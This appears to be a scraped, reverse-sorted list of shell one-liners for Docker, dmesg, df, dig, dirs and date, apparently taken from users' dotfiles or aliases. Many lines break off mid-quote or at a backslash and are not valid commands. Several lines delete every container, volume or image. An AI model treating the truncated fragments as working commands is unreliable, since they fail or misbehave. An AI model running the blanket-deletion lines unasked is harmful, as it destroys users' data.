docker ps | awk -F'[[:space:]][[:space:]][[:space:]]*' '{print $1 $7}'
docker ps | awk '{print \$NF}'
docker ps | awk 'NR==2 { print \$1 }'
docker ps | awk 'BEGIN{FIELDWIDTHS = \
docker ps | awk
docker ps | $HEADER_SORT2
docker ps -q|xargs docker stop
docker ps -q|head -1
docker ps -ql | xargs docker stop
docker ps -ql | xargs docker logs -f
docker ps -qf status=exited | xargs docker rm
docker ps -qf status=exited | xargs -r docker rm
docker ps -qa | xargs docker rm -fv
docker ps -qa | xargs docker rm -f
docker ps -qa | xargs docker rm --force
docker ps -qa | xargs docker rm
docker ps -qa | xargs docker kill
docker ps -qa | xargs -t docker rm
docker ps -qa | xargs -i docker rm -f {}
docker ps -qa | wc -l
docker ps -qa -f exited=0 | xargs docker rm
docker ps -qa --filter status=exited --filter status=created | xargs -r docker rm
docker ps -q | xi docker stop []
docker ps -q | xargs docker stop; docker system df
docker ps -q | xargs docker stop ; docker system prune -a
docker ps -q | xargs docker stop
docker ps -q | xargs docker stats --no-stream
docker ps -q | xargs docker stats
docker ps -q | xargs docker rm -f
docker ps -q | xargs docker rm
docker ps -q | xargs docker kill
docker ps -q | xargs docker inspect --format='{{.NetworkSettings.IPAddress}} -- {{.Name}}'
docker ps -q | xargs docker inspect --format='{{ .Name }} - {{range .NetworkSettings.Networks}}{{println .IPAddress}}{{end}}'
docker ps -q | xargs docker inspect --format '{{ .NetworkSettings.IPAddress }} {{ .Name }} {{ .Config.Image }} {{ .State.Running }} {{ .Id }}'
docker ps -q | xargs docker inspect --format '{{ .Name }} {{ .Config.Image }} {{ .NetworkSettings.IPAddress }} {{ .Config.Cmd }} {{ .Config.ExposedPorts }}'
docker ps -q | xargs docker inspect --format '{{ .Name }} - {{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}'
docker ps -q | xargs docker inspect --format '{{ .Name }} - {{ .NetworkSettings.IPAddress }}'
docker ps -q | xargs docker inspect --format '{{ .Id }} - {{ .Name }} - {{ .NetworkSettings.IPAddress }}'
docker ps -q | xargs docker inspect --format '{{ .Id }} - {{ .Name }} - {{ .NetworkSettings.IPAddress }} - {{ .NetworkSettings.Ports }}'
docker ps -q | xargs -t docker stop
docker ps -q | xargs -r docker stop
docker ps -q | xargs -r docker kill
docker ps -q | xargs -r docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
docker ps -q | xargs -P 13 -L 1 docker logs --follow
docker ps -q | xargs -L1 docker stop && echo 'Docker containers has been killed'
docker ps -q | xargs -L1 docker stop
docker ps -q | xargs -I {} docker stop {}
docker ps -q | xargs -I {} docker pause {}
docker ps -q | xargs -I {} docker kill {}
docker ps -q | xargs --no-run-if-empty docker ${cmd}
docker ps -q | sed -n 1p
docker ps -q | head -n1
docker ps -q -f status=exited | xargs --no-run-if-empty docker rm
docker ps -q -f status=dead -f status=exited | xargs -I {} docker rm {}
docker ps -q -f 'status=running' -f 'status=restarting' -f 'status=paused' | xargs --no-run-if-empty docker stop
docker ps -q -f 'status=exited' | xargs --no-run-if-empty docker rm
docker ps -q -a | xargs docker rm -f
docker ps -q -a | xargs docker rm
docker ps -q -a | xargs -n 1 docker rm
docker ps -q -a | xargs --no-run-if-empty docker rm -f
docker ps -q -a -f 'status=exited' | xargs docker rm -v
docker ps -ls | less
docker ps -lq | xargs docker stop -t 1
docker ps -l -q | xargs docker stop -t 1
docker ps -f=status=exited -q | xargs docker rm -v
docker ps -f status=exited -q | xargs docker rm -f
docker ps -f status=exited -q | xargs docker rm --volumes
docker ps -f status=exited -q | xargs docker rm
docker ps -f status=exited -q | xargs -n1 -I{} docker rm '{}'
docker ps -f status=exited -q | xargs -i docker rm {}
docker ps -f 'status=exited' -q | xargs docker rm -f
docker ps -a|grep -e
docker ps -aq|xargs docker rm -f
docker ps -aq|xargs docker rm
docker ps -aqf status=exited |xargs docker rm
docker ps -aqf status=exited | xargs docker rm -v
docker ps -aqf status=exited | xargs docker rm
docker ps -aqf status=exited | xargs -n1 docker rm
docker ps -aqf 'status=exited' | xargs -L 1 docker rm -f
docker ps -aqf 'status=created' | xargs --no-run-if-empty docker rm -v "
docker ps -aq | xargs docker stop
docker ps -aq | xargs docker start
docker ps -aq | xargs docker rm; docker volume prune -f; docker network prune -f
docker ps -aq | xargs docker rm -fv
docker ps -aq | xargs docker rm -f
docker ps -aq | xargs docker rm
docker ps -aq | xargs docker kill
docker ps -aq | xargs -r docker rm -fv
docker ps -aq | xargs -r docker rm --force
docker ps -aq | xargs -n 1 docker stop -t 0
docker ps -aq | xargs -n 1 docker rm -v
docker ps -aq | xargs -L 1 docker stop
docker ps -aq | xargs --no-run-if-empty docker rm -v
docker ps -aq | xargs --no-run-if-empty docker rm -f
docker ps -aq | xargs --no-run-if-empty docker rm --force --volumes=true
docker ps -aq | xargs --no-run-if-empty docker kill
docker ps -aq | parallel docker rm -f {}
docker ps -aq -f status=exited | xargs docker rm -v
docker ps -aq -f status=exited | xargs docker rm
docker ps -aq -f status=exited | xargs -r docker rm
docker ps -aq -f status=exited | xargs -n 1 docker rm -v
docker ps -aq -f status=exited -f status=created | xargs docker rm --force
docker ps -aq --no-trunc | xargs docker rm
docker ps -aq --no-trunc -f status=exited | xargs docker rm
docker ps -aq --filter 'ancestor=ball6847/angular-dev-base:latest' --filter 'status=exited' | xargs --no-run-if-empty docker rm
docker ps -als | less
docker ps -a | xargs docker rm -f
docker ps -a | sed
docker ps -a | less -SX
docker ps -a | less -S
docker ps -a | head
docker ps -a | grep Exited
docker ps -a | grep -v alpine
docker ps -a | grep -v
docker ps -a | grep -E \
docker ps -a | grep
docker ps -a | cut -c-$(tput cols)
docker ps -a | awk -F\ \ \ \* '{printf(\
docker ps -a | awk 'BEGIN { FS = \
docker ps -a | awk
docker ps -a | $HEADER_SORT2
docker ps -a -q|xargs docker rm
docker ps -a -q|head -1
docker ps -a -q |xargs -ti docker stop {}
docker ps -a -q |xargs -ti docker rm -f {}
docker ps -a -q | xi docker rm []
docker ps -a -q | xargs sudo docker rm
docker ps -a -q | xargs docker stop 2>&1
docker ps -a -q | xargs docker stop
docker ps -a -q | xargs docker rm 2>&1
docker ps -a -q | xargs docker rm -vf
docker ps -a -q | xargs docker rm -v
docker ps -a -q | xargs docker rm -f
docker ps -a -q | xargs docker rm --volumes -f
docker ps -a -q | xargs docker rm
docker ps -a -q | xargs docker kill
docker ps -a -q | xargs docker container stop
docker ps -a -q | xargs docker container rm
docker ps -a -q | xargs -r docker stop
docker ps -a -q | xargs -r docker rm -v
docker ps -a -q | xargs -r docker rm
docker ps -a -q | xargs -r docker kill
docker ps -a -q | xargs -n 1 -I {} docker rm {}
docker ps -a -q | xargs -L1 docker stop
docker ps -a -q | xargs --no-run-if-empty docker rm -f
docker ps -a -q -f=name=nodeapp | xargs -r docker stop
docker ps -a -q -f=name=nodeapp -f status=exited | xargs -r docker rm
docker ps -a -q -f status=running | xargs docker stop
docker ps -a -q -f status=exited | xargs docker rm -v
docker ps -a -q -f status=exited | xargs docker rm && docker images -q --filter \
docker ps -a -q -f status=exited | xargs docker rm
docker ps -a -q -f status=exited | xargs -t docker rm
docker ps -a -q -f status=exited | xargs -r docker rm
docker ps -a -q -f status=exited | xargs -L1 docker rm -v
docker ps -a -q --filter status=exited | xargs --no-run-if-empty docker rm -f
docker ps -a -q --filter status=exited | xargs --no-run-if-empty docker rm
docker ps -a -f status=exited -q | xargs docker rm
docker ps -a -f status=exited -q | xargs -r docker rm -v
docker ps -a --no-trunc | grep
docker ps -a --no-trunc | awk
docker ps -a --no-trunc --filter 'status=exited' -q | xargs -r docker rm
docker ps -a --format='{{.ID}}' | xargs docker rm
docker ps -a --format '{{ .ID }}' | xargs -I {} docker inspect -f '{{ .Name }}{{ printf \
docker ps -a --format 'table {{.Names}}\t{{.Status}} {{.Ports}}' | cut -c 1-`tput cols`
docker ps -a --filter network=func_functions -q | xargs docker stop
docker ps -a --filter network=func_functions -q | xargs docker rm -f
docker ps -a && docker ps -aq | xargs docker rm -f
docker ps --since a1bz3768ez7g -q | xargs docker rm
docker ps --quiet --all | xargs docker rm --force
docker ps --no-trunc | awk '{print $NF}'
docker ps --no-trunc -aq | xargs docker rm -f
docker ps --no-trunc -aq | xargs docker rm
docker ps --no-trunc -a -q | xargs docker rm -f
docker ps --format '{{.Names}}' | xargs docker stats $1
docker ps --format '{{.Names}}' | f --bind \
docker ps --format '{{ .Names }}'|xargs docker stats
docker ps --format 'table {{.Names}}\t{{.RunningFor}}' | (read; sort)
docker ps --format 'table {{.ID | printf \
docker ps --filter status=exited -q | xargs docker rm -vf
docker ps --filter status=exited --quiet | xargs docker rm -v
docker ps --filter status=dead --filter status=exited -aq | xargs docker rm -v
docker ps --filter status=dead --filter status=exited -aq | xargs -r docker rm -v && \
docker ps --filter status=dead --filter status=exited -aq | xargs -r docker rm -v
docker ps --filter 'name=mars_' -q | xargs docker stop
docker ps --before a1bz3768ez7g -q | xargs docker rm
docker ps --all | awk -F\
docker ps --all --quiet | xargs docker rm
docker ps --all --quiet --filter status=exited | xargs -n1 docker rm
docker port temp-aphp 80 | grep -Po
docker port emaki | sed -e \
docker network rm $(docker network ls | awk '/ / { print $1 }')
docker network ls | xargs docker network rm
docker network ls -q | xargs docker network rm
docker network ls -q | xargs docker network inspect --format='{{.Name}} {{range .IPAM.Config}}{{.Subnet}}{{end}}'
docker logs pihole 2>/dev/null| grep random
docker logs cyral_mysql_analyzer 2>&1 | grep -i enduser --color=NEVER
docker logs -f fusion-engine 2>&1 | ccze -m ansi
docker logs -f $(docker ps -q | head -1)
docker kill `docker ps -q | awk '{print $1}'`
docker kill \$(docker-containers | fzf-tmux)
docker kill $DOCKER_REPO | xargs docker rm
docker kill $(docker ps | awk
docker inspect DI | jq
docker inspect $(docker ps -ql) | less
docker inspect $(docker ps -lq) | grep IPAddress
docker inspect $(dl) | jq
docker images|less
docker images|head -10
docker images |grep
docker images |awk 'NR==1{l=length(\$0)}{printf \
docker images | uniq -f 3
docker images | sort
docker images | more
docker images | less -SX
docker images | less -S
docker images | head -n5
docker images | head -8
docker images | head -15
docker images | grep scriberule
docker images | grep \
docker images | grep -v none
docker images | grep -v gcr
docker images | grep --color
docker images | grep
docker images | cut -c-$(tput cols)
docker images | awk 'BEGIN {OFS=\
docker images | awk '/localhost:5000/{print \$1\
docker images | awk '/^<none>/ { print $3 }'
docker images | awk '(NR>1) && (\$2!~/none/) {print \$1\
docker images | awk
docker images | $HEADER_SORT1
docker images 2>&1 | awk
docker images -q|xargs docker rmi
docker images -q|head -1
docker images -qf=dangling=true | xargs --no-run-if-empty docker rmi
docker images -qf dangling=true |xargs docker rmi
docker images -qf dangling=true | xargs docker rmi -f
docker images -qf dangling=true | xargs docker rmi
docker images -qf dangling=true | xargs -r docker rmi --force
docker images -qf dangling=true | xargs -r docker rmi
docker images -qf dangling=true | xargs -n 1 docker rmi
docker images -qf 'dangling=true' | xargs docker rmi
docker images -qf 'dangling=true' | xargs -r docker rmi
docker images -qf 'dangling=true' | xargs --no-run-if-empty docker rmi
docker images -qa | xargs docker rmi
docker images -qa | xargs -i docker rmi -f {}
docker images -q |xargs docker rmi -f
docker images -q |xargs docker rmi
docker images -q | xargs docker rmi -f
docker images -q | xargs docker rmi
docker images -q | xargs -r docker rmi -f
docker images -q | xargs -r docker rmi
docker images -q | while read ding ; do docker rmi -f $ding ; done
docker images -q | wc --lines
docker images -q -f dangling=true |xargs docker rmi
docker images -q -f dangling=true |xargs -r docker rmi
docker images -q -f dangling=true | xargs docker rmi
docker images -q -f dangling=true | xargs -t docker rmi
docker images -q -f dangling=true | xargs -r docker rmi
docker images -q -f dangling=true | xargs -n1 docker rmi
docker images -q -f dangling=true | xargs --no-run-if-empty docker rmi
docker images -q -f 'dangling=true' | xargs docker rmi
docker images -q -f 'dangling=true' | xargs --no-run-if-empty docker rmi
docker images -q -a | xargs docker rmi
docker images -q -a | xargs --no-run-if-empty docker rmi
docker images -q -a -f dangling=true | xargs docker rmi -f
docker images -q --filter=dangling=true | xargs docker rmi -f
docker images -q --filter dangling=true | xargs docker rmi
docker images -q --filter 'dangling=true' | xargs docker rmi
docker images -f dangling=true -q | xargs docker rmi -f
docker images -f dangling=true -q | xargs docker rmi
docker images -f dangling=true -q | xargs -L1 docker rmi
docker images -f 'dangling=true' | xargs docker rmi
docker images -f 'dangling=true' -q | xargs docker rmi
docker images -f 'dangling=true' -q | xargs -L1 docker rmi
docker images -aqf dangling=true | xargs docker rmi
docker images -aq | xargs docker rmi -f
docker images -aq | xargs docker rmi
docker images -aq | xargs --no-run-if-empty docker rmi -f
docker images -aq -f dangling=true | xargs docker rmi
docker images -a | sed
docker images -a | less
docker images -a | grep \
docker images -a | grep '^<none>'
docker images -a -q | xargs docker rmi
docker images -a -q | xargs -r docker rmi
docker images -a -q | parallel docker rmi {}
docker images -a -q -f dangling=true | xargs docker rmi
docker images -a -f dangling=true -q | xargs docker rmi
docker images --quiet | xargs docker rmi
docker images --quiet --filter=dangling=true | xargs docker rmi -
docker images --quiet --filter=dangling=true | xargs docker rmi
docker images --quiet --filter=dangling=true | xargs --no-run-if-empty docker rmi
docker images --quiet --all | xargs docker rmi --force
docker images --no-trunc -q | head -n 1
docker images --no-trunc -aqf dangling=true | xargs docker rmi
docker images --no-trunc -aq | xargs docker rmi
docker images --format 'table {{.Repository}}:{{.Tag}}\t{{.CreatedAt}}\t{{.Size}}' | (head; sort)
docker images --filter dangling=true -q | xargs docker rmi -f
docker images --filter dangling=true -q | xargs docker rmi
docker images --filter dangling=true -q | xargs -n1 -r docker rmi
docker images --filter dangling=true --quiet | xargs docker rmi
docker images --filter 'dangling=true' -q | xargs docker rmi
docker image rm $(docker image ls -q | head -n 1)
docker image prune --force && docker ps -aq -f status=exited | parallel docker rm {}
docker image ls | awk
docker image ls --quiet --filter dangling=true | xargs docker image rm -f
docker image list -q | xargs docker rmi
docker exec -ti system_router_1 cat /etc/nginx/conf.d/staging.conf | sed
docker exec -ti `docker-compose ps -q app | head -n1` bash
docker exec -ti $(docker ps -q | head -n 1) /bin/bash
docker exec -it ace.kafka /bin/sh -c '/opt/kafka*/bin//kafka-run-class.sh kafka.tools.GetOffsetShell --topic polopoly.changelist --broker-list localhost:9092' | cut -d: -f3
docker exec -it `docker ps | grep -oE '\w+postgres_1$'` psql -U postgres
docker exec -it `docker ps -q | awk '{print $1}'` bash
docker exec -it \$(docker-containers | fzf-tmux)
docker exec -it $(docker ps | awk '/postgres/{print $1}') psql -U postgres -S paperstreethouse
docker exec -it $(docker ps -q | head -n1) bash
docker exec -i -t $(docker ps -q | head -1) bash
docker exec -i $(docker ps|awk '/vault:latest/ {print $1}') vault
docker events --since=10m --until=$(date +%s) --format '{{json .}}' | jsonpp
docker container ps -aq | xargs docker container rm
docker container ls | grep dlv
docker container ls -a | grep dlv
docker container ls --quiet --all | xargs docker container rm -f
docker build . && docker run -d `docker images -q|head -1`
docker attach \$(docker-containers | fzf-tmux)
docker \${docker_config_$(echo ${NODE_INSTANCE}-${i}| sed
docker --help | less
docker $(echo $@ | cut -d' ' -f2-)
docids | xargs docker stop
docids | xargs docker rm
do-release-upgrade -d -f DistUpgradeViewNonInteractive; apt-get update; apt-get upgrade -y; apt-get clean; apt-get autoclean -y; composer global self-update; composer global update; composer global clear-cache; npm install npm -g; npm update -g; npm cache clean; pip freeze --local | grep -v
do echo $the_acct \\t $(ps -u $the_acct | wc -l); done"
dnf list| grep -i
dnf list installed | wc -l
dnf list installed | grep -i
dnf list installed | grep
dnames -r NTB008A | xargs -L 1 ./deploy_sysconfig.sh -d
dml | clip
dmidecode -t 4 | less
dmidecode -t 2 | less
dmidecode -t 17 | less
dmidecode --type 17 | more
dmesg|tl
dmesg|tail -n35
dmesg|tail -n 10
dmesg|tail
dmesg|lwatch
dmesg|less
dmesg| tail -n 20
dmesg| less
dmesg| grep -Ei
dmesg |less +G
dmesg | tail -n5
dmesg | tail -n 25
dmesg | tail -n 20
dmesg | tail -n 15
dmesg | tail -n 10
dmesg | tail -30
dmesg | tail -20
dmesg | tail
dmesg | pv -qL 64
dmesg | lnav
dmesg | less +G
dmesg | less
dmesg | grep ttyS
dmesg | grep mmc1
dmesg | grep microcode && sudo spectre-meltdown-checker
dmesg | grep microcode
dmesg | grep Memory
dmesg | grep -v firehol
dmesg | grep -i zr
dmesg | grep -i
dmesg | grep -e IOMMU -e DMAR
dmesg | grep
dmesg | fm +s
dmesg | ccze -A
dmesg | cat >> dmesg.test.txt
dmesg | \less -r
dmesg | $PAGER
dmesg -wH | raffaello -p dmesg
dmesg -t debug | sed -re 's/^(\[[^]]+\]) /\1\n/' > /tmp/.ndm && nano /tmp/.ndm
dmesg -t debug | sed -re 's/^(\[[^]]+\]) /\1\n/'
dmesg -s 999999999 | more
dmesg -dH | tail -20
dmesg -T | tail -n 50
dmesg -T | tail
dmesg -T debug | sed -re 's/^(\[[^]]+\]) /\1\n/' > /tmp/.ndm && nano /tmp/.ndm
dmesg -T --color=always|less -S -R +\>
dmesg -T --color=always| less -R
dmesg -T --color=always | less -R +G
dmesg -L=always | less
dmesg --human --color=always --follow | most
dmesg --color=always|less -R
dmesg --color=always | tail
dmesg --color=always | less -r
dmesg --color=always | less -R
dmesg --color=always | less -IR
dmesg --color=always | less
dmesg --color=always | grep --color=always
dmesg --color=alwaus |less -R
dm | tail
dl | pbcopy
dki |grep none
dki | awk '(NR>1) && (\$2!~/none/) {print \$1\
dk ps | grep
dk images | grep nbyst
dk exec -it `dk ps -q | head -n1`
djpeg -fast -gif $* | giftopnm -verbose > /dev/null
dj dumpdata | python -m json.tool
dj dumpdata sensei|python -m json.tool > project/sesei.json
diva logs wiso | color_server_log.sh
diskutil umount /Volumes/pi_* |
diskutil umount /Volumes/phone_* |
diskutil umount /Volumes/camera_* |
diskutil umount /Volumes/Untitled* |
diskutil umount /Volumes/PMHOME |
diskutil info disk0 | grep SMART' # display SMART status of hard drive
diskutil info disk0 | grep SMART'
diskutil info disk0 | grep SMART
diskutil info /dev/disk1s1 | rg \
diskutil info / | grep Free
dirs|grep
dirs | xclip
dirs | tr ' ' '\n':
dirs | tr ' ' '\n'
dirs | head -10
dirs | awk
dirs -v|sort -k 2
dirs -v|head -11
dirs -vp | sort -nr
dirs -vl | sort -nr
dirs -v |head -10
dirs -v | tail -n +2
dirs -v | sort -r
dirs -v | sort --reverse
dirs -v | sed -E \
dirs -v | most
dirs -v | head -n15
dirs -v | head -n10
dirs -v | head -n 5
dirs -v | head -n 30
dirs -v | head -n 10
dirs -v | head -8
dirs -v | head -7
dirs -v | head -5
dirs -v | head -20
dirs -v | head -10®
dirs -v | head -10
dirs -v | head
dirs -v | grep
dirs -v | column -t
dirs -v | awk '/^[^0]/'
dirs -v -l| less
dirs -pv | sort -k 2
dirs -p | perl -wnl -e 'print \
dirs -p | nl -v 0
dirs -p | awk 'BEGIN { count=0 } { print count \
dirs -lp| uniq
dirW | ll
dir -alF | less
dim|grep
dimg|xargs -r -I@ docker rmi @
dimg | grep adroitlogic
dig axfr local | grep
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | xargs
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d '\
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | sed -e 's/\
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | sed 's/\
dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | awk -F'\
dig -t TXT +short o-o.myaddr.l.google.com @ns1.google.com | sed 's/\
dig -6 TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d '\
dig -6 +short myip.opendns.com @resolver1.opendns.com AAAA && dig -4 +short myip.opendns.com @resolver1.opendns.com A | tee >(pbcopy)
dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d '\
dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com | sed 's/\
dig +short yahoo.com | head -1
dig +short txt istheinternetonfire.com | sed -e 's/\\; / /' -e 's/\
dig +short txt istheinternetonfire.com | fmt
dig +short myip.opendns.com @resolver1.opendns.com; dig +short myip.opendns.com @resolver1.opendns.com | pbcopy
dig +short myip.opendns.com @resolver1.opendns.com | tee ~/var/ip
dig +short myip.opendns.com @resolver1.opendns.com | pbcopy
dig +short myip.opendns.com @resolver1.opendns.com && ifconfig | grep \
dig +short google.com | head -1
diff2html | html2browse
diff2html -i stdin -o stdout | bcat
diff-so-fancy | less
diff | diff-so-fancy
diff | $EDITOR
diff something something | colordiff
diff -y <(git log --oneline ) <(git log --oneline master) |head -20
diff -udB ~/.zshrc.old ~/.zshrc | less
diff -rq prod/ nori/ | grep -E
diff -d -u --label from_login ~/.bash_envs/env_postrc_\$\$ --label now <(envsort)|colordiff
diff -d -u --label before_dotbashrc ~/.bash_envs/env_prerc_\$\$ --label now <(envsort)|colordiff
diff -d -u --label before_dotbashrc ~/.bash_envs/env_prerc_\$\$ --label after_dotbashrc ~/.bash_envs/env_postrc_\$\$|colordiff
diff -W \`stty size | awk {'print \$2'}\`
did --quiet | xargs -r docker rmi
dict -d gcide \$(cut -d: -f1 ~/owncloud/4000words.txt | shuf -n1)
diceware -n 3 -d _ | pass insert -e $@
diceware -d ' ' --no-caps | pbcopy && echo 'Copied six random words to clipboard.'
dhcpcd -4 -U wlan0 | grep ip_address
dh | grep $@
dgs | g
dgres -e '^\[.*\(TRACE\|DEBUG\).*$'
df.sh | column -t
df | grep -v /dev/loop
df | grep -o '^.:'
df | grep -E '\s/$'
df | grep %
df ; ls -FlAt | head -n 25
df /mnt/*| sort -nk 4
df /dev/disk1 | grep -oP '(\d+)%'
df -x devtmpfs -x tmpfs -h | column -t
df -t $(\df --output=fstype / | sed 1d)
df -m | grep -v asec
df -lhP|column -t
df -k | grep ^[/F]
df -h|grep -v none
df -hx tmpfs | column -t
df -hl | awk
df -hl --total | grep total
df -hTP | column -t
df -hT | grep sda
df -hT | grep -v vobs
df -hPT | column -t
df -h |grep /$
df -h |grep -v loop
df -h |grep -v .btrfs
df -h |column -t
df -h |awk
df -h | sort -r -k 5 -i
df -h | sort -n
df -h | rg sda
df -h | hgrep '/dev/sd[a-z][0-9]+'
df -h | head
df -h | grep sda7
df -h | grep sd
df -h | grep root
df -h | grep nvme0n1p5
df -h | grep hd
df -h | grep hadoop
df -h | grep edebise
df -h | grep \
df -h | grep 70385 && beegfs-ctl --getquota --gid 70385
df -h | grep /usr/local
df -h | grep /home
df -h | grep /dev/sda
df -h | grep /dev/sd
df -h | grep /dev/root
df -h | grep /dev/disk1
df -h | grep -v snap
df -h | grep -v none
df -h | grep -v docker
df -h | grep -v /dev/loop
df -h | grep -v -e udev -e snap -e tmpfs
df -h | grep -v -e udev -e snap
df -h | grep -v -e none -e tmpfs
df -h | grep -v 'tmpfs'
df -h | grep -i /dev/sd
df -h | grep -e /dev/sda6 -e Filesystem
df -h | grep -e /dev/sd -e Filesystem
df -h | grep -P \
df -h | grep -E \
df -h | grep -E
df -h | grep '\s*/$'
df -h | cowsay -bn
df -h | awk '/^.*dev\/sda6/ {print \
df -h | \grep -v \^tmpfs
df -h 2>/dev/null | grep '^[\/F]'
df -h /dev/disk0s2/ | grep -C 2 '[0-9\.]\+[GM]\s\+[0-9]\+\%'
df -h .; du -h --max-depth=1 | sort -hr
df -h . |sed 1d'
df -h -x tmpfs -x devtmpfs | column -t
df -h -x tmpfs -x devtmpfs -x overlay | column -t
df -h -T | grep -v tmpfs
df -h --exclude-type=tmpfs --exclude-type=devtmpfs | grep -v /snap/
df -h && du -BG -d 1 --time |sort -nr
df -Th | grep -w /
df -Th --block-size=M | sort -nr
df -PHT -x tmpfs -x devtmpfs -x squashfs | column -t
df -P | column -t
df -H|grep -v loop
df -H | sort -r -k 4
df -H | grep -vE
df -BG | grep -vE
df --total -l -xtmpfs -x rootfs -x devtmpfs -h | grep --color=never -e t
df --si | sort -hk3
df --portability --print-type --si | sort
df --human-readable | grep -e /dev/sd -e Filesystem
df --human-readable --print-type --exclude-type=tmpfs --exclude-type=devtmpfs --exclude-type=debugfs --portability | column -t
df --block-size=1000000000 | grep -v /dev/loop
dexdump -f classes.dex | sed '/^$/Q'
dexdump -d *.dex | less
devx-attach 'journalctl -o json -fu devx-* | jq -r \
devid | xargs -I X adb -s X uninstall $1
devid | xargs -I X adb -s X shell pm clear $1
devid | xargs -I X adb -s X shell am start $1
devid | xargs -I X adb -s X install -r $1
devdiary.py --summarize | less
dev_appserver.py . | h -ni 404 GET starting stop error warn POST 200 jpg html bower
dev_appserver.py --log_level=debug . wstasks.yaml |& tee /tmp/dev_appserver.out
dev_appserver.py --log_level=debug . wstasks.yaml --datastore_path ~/derrick-plan-datastore |& tee /tmp/dev_appserver.plan.out
dev stop && yes | dev rm -v && gw dockerTag --parallel && dev up
detex introduction.tex | wc
designer &>/dev/null&|
dep status -dot | dot -T png > deps.png && open deps.png
demsg|tail -n 20
del \$(ls -td \${NVM_DIR}/versions/node/* | tail -n +2) && del \${NVM_DIR}/.cache/bin
deis releases | tac
deis apps | peco
defaults write com.apple.screencapture disable-shadow -bool true|killall SystemUIServer
defaults write com.apple.screencapture disable-shadow -bool false|killall SystemUIServer
defaults write com.apple.finder AppleShowAllFiles true|killall Finder
defaults write com.apple.finder AppleShowAllFiles false|killall Finder
defaults write com.apple.finder AppleShowAllFiles -bool true | killall Finder
defaults write com.apple.finder AppleShowAllFiles -bool false | killall Finder
defaults write com.apple.finder AppleShowAllFiles -bool TRUE | killall Finder
defaults write com.apple.finder AppleShowAllFiles -bool FALSE | killall Finder
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences |grep SSIDString
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences |grep LastConnected -A 7
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences | grep LastConnected -A7
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences | grep LastConnected -A 7
decolor | diffstat -C
declare | egrep
declare -p | rg
declare -p | mvars_sed
declare -f | less
declare -f | grep ^bkn
declare -f | grep \^[a-zA-Z]
declare -f | egrep '^\w+ \(\)'
declare -f $1 | highlight -S sh -O xterm256
declare -F | sort
declare -F | more
declare -F | less
declare -F | grep -v _
declare -F | grep -v \
declare -F | grep -v ' _'
declare -F | cut -d' ' -f3
declare -F | cut -d' ' -f'3-'
declare -F | cut -b12-
deborphan|xargs sudo apt purge
deborphan | xargs fink purge -y
deborphan | sudo xargs apt-get purge -y
deborphan -Pa -p 0 | sort -k 3
de $(dc ps -q | head -1)
ddi | xargs docker rmi
dd if=/dev/zero bs=1M count=1k 2>/dev/null | openssl enc -rc4-40 -pass pass:weak
dd if=/dev/zero bs=1024k of=tstfile count=1024 2>&1 | grep bytes
dd if=/dev/urandom count=1024 | shasum
dd if=/dev/urandom count=1 bs=42 status=none | base64
dd if=/dev/urandom bs=9 count=1 2>/dev/null | base64
dd if=/dev/urandom bs=64 count=1 2>/dev/null | base64 -w 96
dd if=/dev/urandom bs=6 count=1 2> /dev/null | base64
dd if=/dev/urandom bs=32 count=1 2>/dev/null | openssl base64
dd if=/dev/urandom bs=256 count=1 2>/dev/null | base64
dd if=/dev/urandom bs=1 count=9 2>/dev/null | base64
dd if=/dev/urandom bs=1 count=6 2> /dev/null | base64
dd if=/dev/urandom bs=1 count=40 2>/dev/null | base64
dd if=/dev/random ibs=6 count=1 2>/dev/null | openssl base64
dd if=/dev/random bs=1 count=16 2>/dev/null |xxd -ps
dd if=/dev/mem bs=512 count=16 2>&- | crypt $RANDOM
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
dd if=$1 bs=1 skip=24|openssl zlib -d > ${1}.tar;
dcos node --json | jq 'map(select(.attributes.public_ip).hostname)'
dconf dump / | grep -i
dce --quiet | xargs -r docker rm
dcdl | grep
dc logs -f \`dc ps --services --filter status=running | fzf\`
dc exec \`dc ps --services --filter status=running | fzf\` 2> /dev/null
dc exec $(docker-compose ps --services|peco) /bin/bash --login
dawn | grep
date|pbcopy
date|md5
date;svn status | ack ^C
date;svn status | ack '\?'
date;svn -u status | ack '^ ?. '
date;ls - lt | head
date; psql gpperfmon -c 'SELECT err.txt generated.file succ.txt FROM health_now;' | grep -v normal
date |mail -s 'job done' $EMAIL
date | xsel -bi
date | tr ' ' '-'
date | sha1sum
date | sed -r
date | pbcopy
date | md5sum
date | md5
date | cut -d' ' -f5
date | cut -c 17-21
date | awk '{print \$4}'
date ; ls -lht | head
date -v -4w +%Y%m%d | xargs pkg updating --date
date -u | pbcopy
date -u -R | sed 's/\+0000/GMT/'
date -u --rfc-3339=seconds | sed -e 's/ /T/' -e 's/://g' -e 's/+0000/Z/'
date -u --date='7 days ago' +%Y-%m-%d | xargs -I {} curl -u $GITHUB_USERNAME:$GITHUB_API_TOKEN -H 'Accept: application/vnd.github.cloak-preview' \
date -u +%A | tr '[:upper:]' '[:lower:]'
date -Is; date +%s.%N | tee >(tr -d \
date -I'seconds' | sed -e 's/T/ /g'
date -I | tc
date --rfc-3339=seconds | sed 's/ /T/'
date --rfc-3339=ns | sed 's/ /T/; s/\(\....\).*\([+-]\)/\1\2/g'
date --iso-8601=seconds | tr ' :+' '-'
date --iso-8601=s | tr ':' '-'
date --iso-8601 | sed s/-//g
date +'Work_%Y-%W' | pbcopy; pbpaste
date +'Vida_%Y-%W' | xclip -selection clipboard && xclip -selection clipboard -o
date +'Vida_%Y-%W' | pbcopy; pbpaste
date +'%r'|pbcopy
date +'%a %d-%b-%Y %T %Z' | tr a-z A-Z
date +'%Y-%m-%d'|pbcopy
date +'%Y-%m-%d' | xclip -selection clipboard && xclip -selection clipboard -o
date +'%Y-%m-%d' | pbcopy; pbpaste
